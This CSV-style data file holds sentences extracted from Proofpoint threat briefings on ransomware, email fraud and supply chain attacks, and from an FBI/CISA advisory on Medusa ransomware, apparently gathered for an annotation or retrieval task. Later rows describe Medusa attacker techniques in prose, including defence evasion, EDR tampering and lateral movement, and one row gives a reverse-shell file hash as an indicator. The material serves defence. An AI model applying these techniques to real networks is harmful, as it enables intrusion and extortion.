CAND_01836,R037,3,R037_P0001,R037_S000068,"Infosec professionals revealed that in 2020, 34% of organizations were infected and opted to pay the ransom."
CAND_01837,R037,3,R037_P0001,R037_S000072,"This means that for most businesses, the first line of defense against ransomware is making sure they are protected from initial infection."
CAND_01838,R037,3,R037_P0001,R037_S000074,"MALWARE/DOWNLOADER ASSOCIATED RANSOMWARE Emotet Ryuk The Trick Conti Dridex BitPaymer/DoppelPaymer Qbot Egregor SDBbot Clop ZLoader Egregor and Ryuk Buer (Buer Loader) Ryuk Phorphiex/Trik Avaddon Malicious Messages from Ransomware-associated Malware Strains 1/2 3.5 3.0 2.5 2.0 1.5 1.0 .5 0 Millions 2/2 3/2 4/2 5/2 6/2 All Dates, 2020 7/2 8/2 9/2 10/2 11/2 12/2 Emotet The Trick BazaLoader Qbot SDbot Dridex Zloader Buer Phorpiex"
CAND_01839,R037,4,R037_P0001,R037_S000075,"ABOUT PROOFPOINT Proofpoint, Inc."
CAND_01840,R037,4,R037_P0001,R037_S000081,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_01841,R037,4,R037_P0001,R037_S000085,After the attack In the aftermath of a ransomware attack take steps to restore and resolve the issues caused by the incident.
CAND_01842,R037,4,R037_P0001,R037_S000089,A robust ransomware prevention plan involves people-centric security.
CAND_01843,R037,4,R037_P0001,R037_S000090,It comes with making your employees aware through training based on real-world attack techniques.
CAND_01844,R037,4,R037_P0001,R037_S000092,It helps you quickly respond and take the necessary action before something goes wrong.
CAND_01845,R037,4,R037_P0001,R037_S000093,"To learn more about how to effectively stop ransomware, download our Ransomware Survival Guide • Cleanup and remediation • Post-mortem security review • Assess user awareness • Risk-based, people-centric controls • Reconsider security posture and align investment with the greatest areas of risk • Call law enforcement • Disconnect from the network • Determine the scope of problem based on threat intelligence • Orchestrate a response • Use network segmentation to limit spread • Look for other vulnerabilities, malware and system compromises that likely came with the ransomware • Don’t count on free ransomware decryption tools • Restore critical data—be sure to look for any malware that may have been backed up with other data Before the attack Start with the assumption that you will become a victim of ransomware."
CAND_01846,R037,4,R037_P0001,R037_S000094,"Your next plan should be prevention, detection and response."
CAND_01847,R037,4,R037_P0001,R037_S000097,Paying a ransom funds criminal activity.
CAND_01848,R037,4,R037_P0001,R037_S000099,The right answer isn’t always clear.
CAND_01849,R037,4,R037_P0001,R037_S000101,"Beyond whether the organization will pay a ransom, leaders should decide how much they’re willing to shell out and under what conditions."
CAND_01850,R037,4,R037_P0001,R037_S000103,sanctions lists— may be illegal.
CAND_01851,R038,1,R038_P0001,R038_S000002,“Universal Health Services Estimates $67 Million in Ransomware Losses.” March 2021.
CAND_01852,R038,1,R038_P0001,R038_S000006,“Cognizant expects to lose between $50m and $70m following ransomware attack.” May 2020.
CAND_01853,R038,1,R038_P0001,R038_S000007,"Description: Ransomware encrypts critical data or locks users out of their devices until they pay a ransom to the attacker, typically a crime syndicate."
CAND_01854,R038,1,R038_P0001,R038_S000008,"Tools of the trade: Cryptolocker, WannaCry, Bad Rabbit, Cerber, Crysis, CryptoWall, GoldenEye, Jigsaw, Locky, Petya, Conti, Sodinokibi and Ryuk Origin: 1989, AIDS Trojan created by Joseph Popp."
CAND_01855,R038,1,R038_P0001,R038_S000010,"Types: • Crypto ransomware Cyber criminals encrypt files on a computer, making it impossible for the user to access it."
CAND_01856,R038,1,R038_P0001,R038_S000011,"• Locker ransomware Malware that locks a victim out of the computer, preventing them from accessing the device until a ransom is paid."
CAND_01857,R038,1,R038_P0001,R038_S000012,• “Scareware” Malware designed to trick victims into thinking they have been infected with ransomware and sending payment to the attacker.
CAND_01858,R038,1,R038_P0001,R038_S000013,"Though not technically ransomware, scareware can have the same effect on victims."
CAND_01859,R038,1,R038_P0001,R038_S000015,"It’s one of today’s most disruptive types of cyber attacks, putting victims out of business, forcing hospitals to turn away patients, and bringing entire city governments to a standstill."
CAND_01860,R038,1,R038_P0001,R038_S000020,Administrators quickly attempted to isolate the infection and ringfence a number of systems that prevented the ransomware from traveling to the core UCSF network and causing further damage.2 Cognizant earnings hit with $50M–$70M ransomware costs IT services provider Cognizant was hit with a ransomware attack in April 2020 that hit its Q2 earnings.
CAND_01861,R038,2,R038_P0001,R038_S000022,RANSOMWARE | THREAT BRIEFING 2 Ransomware attack disrupts U.S.
CAND_01862,R038,2,R038_P0001,R038_S000023,"fuel supply One of the nation’s largest pipelines shut down in May 2021 in the wake a ransomware attack, halting operations throughout a 5,500-mile system that supplies nearly half of the total fuel supply to the East Coast.4 The pipeline’s operator paid attackers $4.4 million to unlock the data, but “it ultimately wasn’t enough to immediately restore the pipeline’s systems.”5 World’s largest meat processor suspends beef production after ransomware attack The Brazilian company shut down meatpacking plants in Colorado, Iowa, Minnesota, Pennsylvania, Nebraska and Texas, due to an attack that U.S."
CAND_01863,R038,2,R038_P0001,R038_S000024,"officials say originated in Russia.6 In a news release, the company said it detected the attack on its computer networks in North America and Australia."
CAND_01864,R038,2,R038_P0001,R038_S000027,“Cyberattack Forces a Shutdown of a Top U.S.
CAND_01865,R038,2,R038_P0001,R038_S000029,5 Collin Eaton and Dustin Volz (The Wall Street Journal).
CAND_01866,R038,2,R038_P0001,R038_S000030,“Colonial Pipeline CEO Tells Why He Paid Hackers a $4.4 Million Ransom.” May 2021.
CAND_01867,R038,2,R038_P0001,R038_S000031,6 Jacob Bunge (The Wall Street Journal).
CAND_01868,R038,2,R038_P0001,R038_S000032,“Meat Buyers Scramble After Cyberattack Hobbles JBS.” June 2021.
CAND_01869,R038,2,R038_P0001,R038_S000033,"7 Hamza Shaban, Ellen Nakashima and Rachel Lerman (The Washington Post)."
CAND_01870,R038,2,R038_P0001,R038_S000034,"“JBS, world’s largest meat processor, shut down U.S."
CAND_01871,R038,2,R038_P0001,R038_S000040,So threat actors have evolved.
CAND_01872,R038,2,R038_P0001,R038_S000042,"The information could be highly sensitive, personal and can have devastating consequences if it becomes public knowledge."
CAND_01873,R038,2,R038_P0001,R038_S000045,Ransom note | A note is then displayed to the victim demanding payment for the release of files.
CAND_01874,R038,2,R038_P0001,R038_S000046,4.
CAND_01875,R038,2,R038_P0001,R038_S000048,3.
CAND_01876,R038,2,R038_P0001,R038_S000049,Staging | The ransomware payload dropped by the file conceals and embeds itself within the system.
CAND_01877,R038,2,R038_P0001,R038_S000050,2.
CAND_01878,R038,3,R038_P0001,R038_S000058,Here is a list of common malware strains and ransomware mostly closely associated with them.
CAND_01879,R038,3,R038_P0001,R038_S000059,"Emotet, The Trick, Dridex and Qbot were among the most prolific malware we saw in 2020, with steady volumes across the year and significant spikes in the fall."
CAND_01880,R038,3,R038_P0001,R038_S000061,organisations surveyed said they paid a ransom in 2020.
CAND_01881,R038,3,R038_P0001,R038_S000062,That’s twice the global average.
CAND_01882,R038,3,R038_P0001,R038_S000063,While 41% of Spanish organisations refused to pay the ransom after being infected.
CAND_01883,R038,3,R038_P0001,R038_S000065,"Upon paying a one-time ransom, 78% of French organisations were able to regain access to their data."
CAND_01884,R038,3,R038_P0001,R038_S000066,The U.S.
CAND_01885,R038,3,R038_P0001,R038_S000069,32% were infected but didn’t pay the ransom and 34% said they did not experience ransomware.
CAND_01886,R038,3,R038_P0001,R038_S000071,Cyber criminals distributing trojans and other kinds of malware allow ransomware groups to use backdoors into infected systems in return for a share of the profits.
CAND_01887,R038,3,R038_P0001,R038_S000072,"This means that for most businesses, the first line of defence against ransomware is making sure they are protected from initial infection."
CAND_01888,R038,3,R038_P0001,R038_S000073,"In other words, block the loader and you block the ransomware."
CAND_01889,R038,3,R038_P0001,R038_S000074,"MALWARE/DOWNLOADER ASSOCIATED RANSOMWARE Emotet Ryuk The Trick Conti Dridex BitPaymer/DoppelPaymer Qbot Egregor SDBbot Clop ZLoader Egregor and Ryuk Buer (Buer Loader) Ryuk Phorphiex/Trik Avaddon Malicious Messages from Ransomware-associated Malware Strains 1/2 3.5 3.0 2.5 2.0 1.5 1.0 .5 0 Millions 2/2 3/2 4/2 5/2 6/2 All Dates, 2020 7/2 8/2 9/2 10/2 11/2 12/2 Emotet The Trick BazaLoader Qbot SDbot Dridex Zloader Buer Phorpiex"
CAND_01890,R038,4,R038_P0001,R038_S000077,"With an integrated suite of cloud-based solutions, Proofpoint helps companies around the world stop targeted threats, safeguard their data and make their users more resilient against cyber attacks."
CAND_01891,R038,4,R038_P0001,R038_S000078,"Leading organisations of all sizes, including more than half of the Fortune 1000, rely on Proofpoint for people-centric security and compliance solutions that mitigate their most critical risks across email, the cloud, social media and the web."
CAND_01892,R038,4,R038_P0001,R038_S000080,"©Proofpoint, Inc."
CAND_01893,R038,4,R038_P0001,R038_S000082,in the United States and other countries.
CAND_01894,R038,4,R038_P0001,R038_S000087,For example: How to Protect Your Organisation The best way to deal with ransomware is to avoid it in the first place.
CAND_01895,R038,4,R038_P0001,R038_S000088,LEARN MORE The best way to stop ransomware is proactive prevention.
CAND_01896,R038,4,R038_P0001,R038_S000090,It comes with making your employees aware through training based on real-world attack techniques.
CAND_01897,R038,4,R038_P0001,R038_S000092,It helps you quickly respond and take the necessary action before something goes wrong.
CAND_01898,R038,4,R038_P0001,R038_S000097,Paying a ransom funds criminal activity.
CAND_01899,R038,4,R038_P0001,R038_S000100,"Organisations must consider a few factors before deciding the course of action: • Safety of the customers and employees • Time and resources needed to recover • Responsibilities to the shareholders to keep the business running • Kind of criminal activity the payment would potentially fund Whatever the decision, it should take place before an attack, when executives aren’t under the pressure of a looming deadline and severely disrupted business."
CAND_01900,R038,4,R038_P0001,R038_S000103,sanctions lists—may be illegal.
CAND_01901,R039,2,R039_P0001,R039_S000003,These socially engineered attacks seek to exploit people rather than technology.
CAND_01902,R039,2,R039_P0001,R039_S000005,"Email fraud preys on human nature–fear, the desire to please, and more–to steal money and valuable information from employees, customers, and business partners."
CAND_01903,R039,2,R039_P0001,R039_S000006,"Proofpoint analyzed more than 160 billion emails sent to more than 2,400 companies spanning 150 countries."
CAND_01904,R039,3,R039_P0001,R039_S000009,"While the threat continues to be highly targeted, attacks were launched against more organizations and more frequently vs."
CAND_01905,R039,3,R039_P0001,R039_S000010,2016.
CAND_01906,R039,3,R039_P0001,R039_S000011,"The percentage of companies targeted by at least one email fraud attack steadily rose, reaching a new high of 88.8% in Q4."
CAND_01907,R039,3,R039_P0001,R039_S000012,That’s up 13.8 percentage points over the 75.0% of organizations targeted in the year-ago quarter.
CAND_01908,R039,3,R039_P0001,R039_S000015,Oct Nov Dec Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec Business Email Compromise attacks detected and blocked by Proofpoint Q3 and Q4 represented two of the three biggest quarters we've ever recorded in email fraud volume.
CAND_01909,R039,3,R039_P0001,R039_S000017,"Spoofing more identities After holding steady for the first three quarters, the average number of identities spoofed per organization more than doubled in Q4 to about 10 identities."
CAND_01910,R039,3,R039_P0001,R039_S000018,This shift makes sense.
CAND_01911,R039,3,R039_P0001,R039_S000023,"In many cases, they can craft a convincing email using social engineering and employee information widely available on the web and social media."
CAND_01912,R039,4,R039_P0001,R039_S000031,"They are also opportunistic, targeting companies across all industries."
CAND_01913,R039,4,R039_P0001,R039_S000033,Only one quarter (Q2 of 2017) showed any correlation at all—attackers revealed a slight preference for larger targets.
CAND_01914,R039,4,R039_P0001,R039_S000034,Attackers Target Many Industries Financial services and manufacturing are among the most frequently targeted.
CAND_01915,R039,4,R039_P0001,R039_S000037,"But from the attacker’s point of view, the pattern makes sense."
CAND_01916,R039,4,R039_P0001,R039_S000039,But smaller entities are often more vulnerable to these advanced threats.
CAND_01917,R039,4,R039_P0001,R039_S000041,"MANY-TO-MANY ATTACKS In many-to-many attacks, fraudsters impersonate multiple executives and target several recipients."
CAND_01918,R039,4,R039_P0001,R039_S000042,"For example, an attacker might try impersonating several managers and target a company’s whole finance team."
CAND_01919,R039,5,R039_P0001,R039_S000043,"Email Fraud Threat Report | Year in Review 2017 5 Attackers target many industries In earlier research, we saw a mostly uniform spread of email fraud attempts across industries."
CAND_01920,R039,5,R039_P0001,R039_S000044,"(Though the financial services, manufacturing, healthcare, and energy/utility sectors were targeted slightly more frequently.) In Q4, attackers targeted new industries."
CAND_01921,R039,5,R039_P0001,R039_S000049,"Document, Date, Legal, Confidential, Tax Wire fraud WIRE-TRANSFER FRAUD continues to be the most frequent form of email fraud at nearly 27% of email fraud message volume."
CAND_01922,R039,5,R039_P0001,R039_S000059,"“Legal” Two more subject categories spiked in Q4: those that included a date and those that included “legal.” Though still small in absolute terms, attacks that took a “legal” angle grew 1,850% over the previous year."
CAND_01923,R039,5,R039_P0001,R039_S000061,Those records are then used for identity theft and other attacks.
CAND_01924,R039,5,R039_P0001,R039_S000062,It’s named after the W2 tax form U.S.
CAND_01925,R039,5,R039_P0001,R039_S000063,employers use to report worker wages.
CAND_01926,R039,6,R039_P0001,R039_S000069,Fabricated email histories Fraud attempts that included fake email histories rose each quarter of 2017.
CAND_01927,R039,6,R039_P0001,R039_S000071,The fabricated email chain appends a realistic-looking email history that suggests that the required stakeholders have already approved the request.
CAND_01928,R039,6,R039_P0001,R039_S000078,Display-name spoofing DISPLAY-NAME SPOOFING through web-based email services accounted for about 40% of email fraud attacks in Q4.
CAND_01929,R039,6,R039_P0001,R039_S000079,"Aol.com and gmail.com were the preferred sending domains for these threats, though attackers also use many other domains."
CAND_01930,R039,6,R039_P0001,R039_S000080,DMARC adoption Domain-spoofing attacks can be prevented by implementing DMARC email authentication.
CAND_01931,R039,6,R039_P0001,R039_S000085,A key part of the directive orders all civilian federal agencies to deploy DMARC quickly.
CAND_01932,R039,6,R039_P0001,R039_S000087,Only about 17% of the agencies had adopted DMARC.
CAND_01933,R039,6,R039_P0001,R039_S000092,No Yes DOMAIN-SPOOFING Spoofing impersonates trusted colleagues or contacts by making an attacker’s emails appear to come from a legitimate and expected address.
CAND_01934,R039,6,R039_P0001,R039_S000094,"When the recipient replies, the response actually goes to the address specified in the email’s “Reply to:” header."
CAND_01935,R039,6,R039_P0002,R039_S000095,"DMARC DMARC, which stands for “Domain- based Message Authentication, Reporting and Conformance,” is an email authentication protocol that can prevent many email fraud attacks."
CAND_01936,R039,7,R039_P0002,R039_S000100,"They may swap out individual characters, such as the numeral 0 in place of the letter O."
CAND_01937,R039,7,R039_P0002,R039_S000101,"Or they may insert characters, such as adding an S at the end of the domain."
CAND_01938,R039,7,R039_P0002,R039_S000103,"That’s probably because the technique requires the attacker to register a domain, which costs money."
CAND_01939,R039,7,R039_P0002,R039_S000107,"The most common swaps were: • An L in place of an I (17.4%) • The numeral 0 for the letter O (8.7%) • V for U (8%) Character-Swapping in Lookalike Domains Because some characters resemble others, fraudsters have many options for creating domains that look like yours."
CAND_01940,R039,8,R039_P0001,R039_S000112,This approach accounted for about 13% of registered lookalike domains.
CAND_01941,R039,8,R039_P0002,R039_S000116,"They are evading traditional security solutions, leaving employees as the last line of defense."
CAND_01942,R039,8,R039_P0003,R039_S000119,DMARC email authentication.
CAND_01943,R039,8,R039_P0003,R039_S000120,Block all impostor attacks that spoof trusted email domains.
CAND_01944,R039,8,R039_P0003,R039_S000122,Dynamic classification.
CAND_01945,R039,8,R039_P0003,R039_S000124,3.
CAND_01946,R039,8,R039_P0003,R039_S000130,HOMOGRAPH SPOOFING Homograph spoofing mixes character sets from different languages to create lookalike domains that appear identical to people but are actually different to a computer.
CAND_01947,R039,9,R039_P0001,R039_S000136,"Proofpoint helps cybersecurity professionals protect their users from the advanced attacks that target them (via email, mobile apps, and social media), protect the critical information people create, and equip their teams with the right intelligence and tools to respond quickly when things go wrong."
CAND_01948,R039,9,R039_P0001,R039_S000137,"Leading organizations of all sizes, including over 50 percent of the Fortune 100, rely on Proofpoint solutions, which are built for today’s mobile and social-enabled IT environments and leverage both the power of the cloud and a big-data-driven analytics platform to combat modern advanced threats."
CAND_01949,R039,9,R039_P0001,R039_S000139,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_01950,R039,9,R039_P0001,R039_S000141,All other trademarks contained herein are property of their respective owners.
CAND_01951,R040,1,R040_P0001,R040_S000001,THREAT BRIEFING Supply Chain Attacks Fast Facts DESCRIPTION Supply chain attacks fall into two main categories: email fraud and third-party software.
CAND_01952,R040,1,R040_P0001,R040_S000002,"In these attacks, cyber criminals compromise vendors or service providers in order to attack their customers and partners."
CAND_01953,R040,1,R040_P0001,R040_S000003,Initial supplier compromise is often by phishing or malware.
CAND_01954,R040,1,R040_P0001,R040_S000006,"TOOLS OF THE TRADE Supply chain threats typically involve phishing for credentials (account takeover), malware (Stuxnet, NotPetya, Sunburst, Kwampirs) and impostor threats like business email compromise (BEC)."
CAND_01955,R040,1,R040_P0001,R040_S000007,"TYPES • Business email compromise (BEC, or email fraud)."
CAND_01956,R040,1,R040_P0001,R040_S000008,"Attackers pose as someone the recipient would trust—typically a business partner, supplier or vendor."
CAND_01957,R040,1,R040_P0001,R040_S000009,"The recipient is asked to make a wire transfer, pay a fake or altered invoice, divert payroll funds or change banking details for future payments."
CAND_01958,R040,1,R040_P0001,R040_S000010,"In some email fraud schemes, the attacker may compromise the supplier’s actual email account to pose as the supplier and even piggyback existing email conversations."
CAND_01959,R040,1,R040_P0001,R040_S000011,• Software supply chain attacks.
CAND_01960,R040,1,R040_P0001,R040_S000012,Attackers gain access to the systems of a software or managed service provider and infect future builds that are then distributed on to customers and partners.
CAND_01961,R040,2,R040_P0001,R040_S000017,2 SUPPLY CHAIN ATTACKS \ THREAT BRIEFING Anatomy of a Supply Chain Attack 1.
CAND_01962,R040,2,R040_P0001,R040_S000018,"Infiltration Attackers use a variety of methods for the initial breach: • Brute-force attacks with automated tools to try username and password pairs until a match is found • Impersonating a trusted contact to send phishing, impostor emails or links/ attachments containing malware such as keyloggers or stealers • Taking over the account of a trusted supplier 2."
CAND_01963,R040,2,R040_P0001,R040_S000021,3.
CAND_01964,R040,2,R040_P0001,R040_S000023,HOW CRIME-AS-A-SERVICE HAS FUELED SUPPLY CHAIN ATTACKS The dark web is a notorious marketplace for exploit kits and custom malware used to sell services like botnet rentals and ransomware software.
CAND_01965,R040,2,R040_P0001,R040_S000024,"Just like most SaaS providers, cyber criminals provide tools and platforms to those carry out supply chain attacks, ransomware attacks and other cyber crime."
CAND_01966,R040,2,R040_P0001,R040_S000025,Threat actors who lack advanced technical skills can now easily carry out attacks.
CAND_01967,R040,2,R040_P0001,R040_S000026,"Research Insights Over a one-week period in February 2021, Proofpoint analyzed data from 3,000 organizations across various verticals in the U.S., U.K."
CAND_01968,R040,2,R040_P0001,R040_S000028,"During that time, the vast majority experienced supply chain attacks."
CAND_01969,R040,2,R040_P0001,R040_S000029,98% received a threat from a supplier who was either impersonated or compromised.
CAND_01970,R040,2,R040_P0001,R040_S000030,Attacks were equally likely across all countries and industry sectors in the sample.
CAND_01971,R040,3,R040_P0001,R040_S000033,"3 SUPPLY CHAIN ATTACKS \ THREAT BRIEFING How to protect your organization To address supply chain fraud and software supply chain attack, here are some key security controls organizations should consider implementing."
CAND_01972,R040,3,R040_P0001,R040_S000034,"Supply chain fraud For supplier invoicing fraud, organizations should take a holistic, multi-layered approach, as attackers often leverage both supplier impersonation and compromised supplier accounts jointly."
CAND_01973,R040,3,R040_P0001,R040_S000035,BEC often starts with an email in which the attacker poses as someone the target trusts or “actually becomes” that person by compromising their account.
CAND_01974,R040,3,R040_P0001,R040_S000036,"Because there is no malicious payload, BEC attacks are hard for legacy gateways that only rely on reputation and malware sandboxing to detect."
CAND_01975,R040,3,R040_P0001,R040_S000037,Here’s how to stop the most common—and costly— supply-chain attacks.
CAND_01976,R040,3,R040_P0001,R040_S000038,"Get visibility into your supplier email fraud risks To help you better understand, communicate and mitigate, get answers to the following questions: • What are our BEC risks?"
CAND_01977,R040,3,R040_P0001,R040_S000041,• What should we do to mitigate the risks?
CAND_01978,R040,3,R040_P0001,R040_S000042,You should know which of your users are most attacked by impostor threats and who is most likely to fall for these types of threats.
CAND_01979,R040,3,R040_P0001,R040_S000043,"At the same time, having granular visibility into BEC threat details and identifying common BEC themes, such as supplier invoicing fraud and payroll diversion, can help you better understand and communicate BEC risk."
CAND_01980,R040,3,R040_P0001,R040_S000045,Look for a solution that dynamically analyzes messages for numerous tactics associated with supplier invoicing fraud such as: • Reply-to pivots • Use of malicious IPs • Use of impersonated supplier domains • Words or phrases commonly used in these supplier fraud attacks (Most email security products only rely on static rule matching or limited contextual data which requires manual tuning.) Make users resilient against BEC supply chain attacks BEC targets people and relies on them to unwittingly carry out the attack.
CAND_01981,R040,3,R040_P0001,R040_S000047,That’s why mitigating BEC risks requires both technology and training.
CAND_01982,R040,3,R040_P0001,R040_S000048,Train your users to identify and report suspicious impostor email.
CAND_01983,R040,3,R040_P0001,R040_S000049,This will give them the knowledge and skills they need to protect your organization against these human-activated threats.
CAND_01984,R040,3,R040_P0001,R040_S000052,"Protect your own brand from being used in email fraud attacks While you’re concerned about the risk your suppliers might pose, your own customers may have similar concerns about you."
CAND_01985,R040,3,R040_P0001,R040_S000054,"While brand spoofing may not cause direct financial loss to your organization, it can damage your organization’s reputation, erode customer trust and ultimately hurt business."
CAND_01986,R040,3,R040_P0001,R040_S000056,"For supplier invoicing fraud, organizations should take a holistic, multi-layered approach, as attackers often leverage both supplier impersonation and compromised supplier accounts jointly."
CAND_01987,R040,4,R040_P0001,R040_S000057,"ABOUT PROOFPOINT Proofpoint, Inc."
CAND_01988,R040,4,R040_P0001,R040_S000058,is a leading cybersecurity and compliance company that protects organizations’ greatest assets and biggest risks: their people.
CAND_01989,R040,4,R040_P0001,R040_S000061,More information is available at www.proofpoint.com.
CAND_01990,R040,4,R040_P0001,R040_S000062,"©Proofpoint, Inc."
CAND_01991,R040,4,R040_P0001,R040_S000063,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_01992,R040,4,R040_P0001,R040_S000064,in the United States and other countries.
CAND_01993,R040,4,R040_P0001,R040_S000065,All other trademarks contained herein are property of their respective owners.
CAND_01994,R040,4,R040_P0001,R040_S000066,"Proofpoint.com 1207-002-01-01 05/22 SUPPLY CHAIN ATTACKS \ THREAT BRIEFING Learn More With supply chain attacks dominating the headlines, it is clear that third-party services, vendors and contractors pose a serious risk to the security posture of organizations."
CAND_01995,R040,4,R040_P0001,R040_S000067,"A people-centric security solution that detects new attack tools, targets and tactics can help to mitigate that risk."
CAND_01996,R040,4,R040_P0001,R040_S000069,"Software supply chain attacks Beyond the more common supply chain attacks discussed above, the increased use of third-party and managed software has created an additional type of supply chain risk."
CAND_01997,R040,4,R040_P0001,R040_S000070,"If a compromised supplier provides software or cloud services, attackers can alter source code and inject malware into the build and update process."
CAND_01998,R040,4,R040_P0001,R040_S000072,"Users often lack the capacity to inspect the third-party programs they use, meaning they must depend on their software vendors and suppliers to have strong protections in place."
CAND_01999,R040,4,R040_P0001,R040_S000073,"If compromised software is delivered to an organization, they can then find themselves open to a full range of attacks, from data theft to ransomware infection."
CAND_02000,R040,4,R040_P0001,R040_S000075,"Unpatched software vulnerabilities are one of the most common vectors for cyber attack, so updating software to the latest versions is always considered a best practice."
CAND_02001,R041,1,R041_P0001,R041_S000006,"Sources may use TLP:CLEAR when information carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public release."
CAND_02002,R041,1,R041_P0001,R041_S000008,"For more information on the Traffic Light Protocol, see cisa.gov/tlp."
CAND_02003,R041,1,R041_P0002,R041_S000010,#StopRansomware: Medusa Ransomware Summary Note: This joint Cybersecurity Advisory is part of an ongoing #StopRansomware effort to publish advisories for network defenders detailing various ransomware variants and ransomware threat actors.
CAND_02004,R041,1,R041_P0002,R041_S000012,Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
CAND_02005,R041,1,R041_P0002,R041_S000013,"The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and the Multi-State Information Sharing and Analysis Center (MS-ISAC) are releasing this joint advisory to disseminate known Medusa ransomware TTPs and IOCs, identified through FBI investigations as recently as February 2025."
CAND_02006,R041,1,R041_P0002,R041_S000014,Medusa is a ransomware-as-a-service (RaaS) variant first identified in June 2021.
CAND_02007,R041,2,R041_P0001,R041_S000020,The Medusa ransomware variant is unrelated to the MedusaLocker variant and the Medusa mobile malware variant per the FBI’s investigation.
CAND_02008,R041,2,R041_P0001,R041_S000021,"FBI, CISA, and MS-ISAC encourage organizations to implement the recommendations in the Mitigations section of this advisory to reduce the likelihood and impact of Medusa ransomware incidents."
CAND_02009,R041,2,R041_P0001,R041_S000022,"For a downloadable list of IOCs, see:  AA25-071A STIX XML (34KB)  AA25-071A STIX JSON (42KB) Technical Details Note: This advisory uses the MITRE ATT&CK® Matrix for Enterprise framework, version 16."
CAND_02010,R041,2,R041_P0001,R041_S000027,"Both Medusa developers and affiliates—referred to as “Medusa actors” in this advisory— employ a double extortion model, where they encrypt victim data and threaten to publicly release exfiltrated data if a ransom is not paid."
CAND_02011,R041,2,R041_P0001,R041_S000033,"Once a foothold in a victim network is established, commonly scanned ports include:  21 (FTP)  22 (SSH)"
CAND_02012,R041,3,R041_P0001,R041_S000034,TLP:CLEAR FBI | CISA | MS-ISAC Page 3 of 15 | Product ID: AA25-071A TLP:CLEAR  23 (Telnet)  80 (HTTP)  115 (SFTP)  443 (HTTPS)  1433 (SQL database)  3050 (Firebird database)  3128 (HTTP web proxy)  3306 (MySQL database)  3389 (RDP) Medusa actors primarily use PowerShell [T1059.001] and the Windows Command Prompt (cmd.exe) [T1059.003] for network [T1046] and filesystem enumeration [T1083] and to utilize Ingress Tool Transfer capabilities [T1105].
CAND_02013,R041,3,R041_P0001,R041_S000037,(See Appendix A for associated shell commands observed during FBI investigations of Medusa victims.) Certutil (certutil.exe) is used to avoid detection when performing file ingress.
CAND_02014,R041,3,R041_P0001,R041_S000038,"Actors have been observed using several different PowerShell detection evasion techniques with increasing complexity, which are provided below."
CAND_02015,R041,4,R041_P0001,R041_S000047,"In some instances, Medusa actors attempted to use vulnerable or signed drivers to kill or delete endpoint detection and response (EDR) tools [T1562.001]."
CAND_02016,R041,4,R041_P0001,R041_S000051,o Formerly known as ArgoTunnel.
CAND_02017,R041,4,R041_P0001,R041_S000055,Medusa uses these tools—in combination with Remote Desktop Protocol (RDP) [T1021.001] and PsExec [T1569.002]—to move laterally [TA0008] through the network and identify files for exfiltration [TA0010] and encryption [T1486].
CAND_02018,R041,4,R041_P0001,R041_S000058, Execute remote shell commands using cmd /c.
CAND_02019,R041,5,R041_P0001,R041_S000063,Encrypted files have a .medusa file extension.
CAND_02020,R041,5,R041_P0001,R041_S000071,"At this stage, Medusa concurrently advertises sale of the data to interested parties before the countdown timer ends."
CAND_02021,R041,5,R041_P0001,R041_S000074,Indicators of Compromise Table 1 lists the hashes of malicious files obtained during investigations.
CAND_02022,R041,6,R041_P0001,R041_S000076,TLP:CLEAR FBI | CISA | MS-ISAC Page 6 of 15 | Product ID: AA25-071A TLP:CLEAR Files Hash (MD5) Description pu.exe 80d852cd199ac923205b61658a9ec5bc Reverse shell Table 2 includes email addresses used by Medusa actors to extort victims; they are exclusively used for ransom negotiation and contacting victims following compromise.
CAND_02023,R041,7,R041_P0001,R041_S000084,Obfuscated Files or Information: Encrypted/Encoded File T1027.013 Medusa actors use a well-known evasion technique that executes a base64 encrypted command.
CAND_02024,R041,7,R041_P0001,R041_S000086,Indicator Removal T1070 Medusa actors deleted their previous work and tools installed.
CAND_02025,R041,7,R041_P0001,R041_S000087,Impair Defenses: Disable or Modify Tools T1562.001 Medusa actors killed or deleted endpoint detection and response tools.
CAND_02026,R041,7,R041_P0001,R041_S000089,File and Directory Discovery T1083 Medusa actors utilized Windows Command Prompt for filesystem enumeration.
CAND_02027,R041,7,R041_P0001,R041_S000090,Network Share Discovery T1135 Medusa actors queried shared drives on the local system to gather sources of information.
CAND_02028,R041,8,R041_P0001,R041_S000098,"Command and Scripting Interpreter: Windows Command Shell T1059.003 Medusa actors used Windows Command Prompt—which can be used to control almost any aspect of a system—for ingress, network, and filesystem enumeration."
CAND_02029,R041,8,R041_P0001,R041_S000099,Software Deployment Tools T1072 Medusa Actors used PDQ Deploy and BigFix to deploy the encryptor on files across the network.
CAND_02030,R041,8,R041_P0001,R041_S000100,"Remote Services: Remote Desktop Protocol T1021.001 Medusa actors used Remote Desktop Protocol (RDP), a common feature in operating systems, to log into an interactive session with a system and move laterally."
CAND_02031,R041,8,R041_P0001,R041_S000101,System Services T1569.002 Medusa actors used Sysinternals PsExec to deploy the encryptor on files across the network.
CAND_02032,R041,8,R041_P0001,R041_S000102,Windows Management Instrumentation T1047 Medusa actors abused Windows Management Instrumentation to query system information.
CAND_02033,R041,9,R041_P0001,R041_S000109,Table 10: Persistence Technique Title ID Use Create Account T1136.002 Medusa actors created a domain account to maintain access to victim systems.
CAND_02034,R041,9,R041_P0001,R041_S000110,Table 11: Impact Technique Title ID Use Data Encrypted for Impact T1486 Medusa identified and encrypted data on target systems to interrupt availability to system and network resources.
CAND_02035,R041,10,R041_P0001,R041_S000115,These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST).
CAND_02036,R041,10,R041_P0001,R041_S000117,"CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures."
CAND_02037,R041,10,R041_P0001,R041_S000128," Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool."
CAND_02038,R041,11,R041_P0001,R041_S000135, Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege [CPG 2.E].
CAND_02039,R041,11,R041_P0001,R041_S000140, Disable unused ports [CPG 2.V].
